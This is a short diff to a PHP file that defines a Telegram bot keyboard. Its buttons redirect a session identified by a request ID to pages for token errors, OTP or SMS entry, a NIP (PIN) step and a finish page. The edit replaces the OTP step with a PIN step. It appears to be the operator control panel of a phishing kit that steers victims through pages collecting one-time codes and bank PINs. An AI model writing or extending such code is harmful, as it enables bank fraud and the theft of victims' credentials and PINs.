@@ -143,8 +143,8 @@ $keyboard = [
             ['text' => '【🛑】𝖳𝗈𝗄𝖾𝗇 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:otp-error.php"]
         ],
         [
-            ['text' => '【🍀】𝖮𝖳𝖯', 'callback_data' => "redir:$request_id:sms.php"],
-            ['text' => '【🛑】𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:sms-error.php"]
+            ['text' => '【🍀】𝖭𝖨𝖯', 'callback_data' => "redir:$request_id:nip.php"],
+            ['text' => '【🛑】𝖭𝖨𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:nip-error.php"]
         ],
         [
             ['text' => '【🏁】𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
